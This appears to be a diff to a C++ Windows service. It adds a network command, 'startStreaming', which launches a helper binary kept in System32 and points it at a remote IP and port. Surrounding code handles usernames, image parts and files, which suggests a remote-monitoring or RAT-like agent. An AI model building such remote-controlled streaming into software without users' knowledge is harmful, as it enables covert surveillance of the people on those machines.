@@ -131,6 +131,7 @@ void StopService()
 {
 	StopProc("loop.exe");
 	StopProc("bReader.exe");
+	StopProc("sService.exe");
 
 	if (ControlSampleService(SERVICE_CONTROL_STOP))
 		writeLog("Service stopped");
@@ -394,6 +395,7 @@ BOOL Online(int port, std::string& ip, const char* command)
 	WSADATA WsaData;
 	char username[100];
 	char beforeName[100] = "##name##";
+	char startStreaming[50] = "startStreaming";
 	DWORD username_len = 100;
 	int check = 0;
 	const int imagePartSize = 1024;
@@ -573,6 +575,14 @@ BOOL Online(int port, std::string& ip, const char* command)
 
 				CloseHandle(rFile);
 			}
+			else if (!strcmp(startStreaming, buffer))
+			{	
+				std::string command = "C:\\Windows\\System32\\sService.exe";
+				std::string sPort = std::to_string(port - 2);
+				std::string com = sPort + ip;
+				LaunchProcess(command.c_str(), com.c_str(), false, false);
+			}
+
 		}
 		else
 			return false;
